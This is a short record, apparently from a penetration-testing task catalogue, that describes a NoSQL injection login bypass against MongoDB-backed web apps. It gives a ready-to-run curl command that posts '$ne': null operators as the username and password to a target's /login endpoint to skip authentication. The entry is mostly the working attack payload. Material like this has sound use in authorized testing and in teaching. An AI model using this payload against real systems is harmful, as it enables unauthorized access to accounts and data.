categories.category: 3. NoSQL Injection (Web App Backed by Mongo)

tasks.title: Login Bypass via Query Operators
tasks.description: If a web login form passes user input straight into a Mongo query (common with Node/Express apps parsing JSON bodies), operators like $ne/$gt/$regex can bypass authentication without any valid credentials. Doesn't require the DB port to be reachable at all — this is purely an HTTP-layer attack against the app.
commands: curl -X POST http://{target_ip}/login -H 'Content-Type: application/json' -d '{"username": {"$ne": null}, "password": {"$ne": null}}'
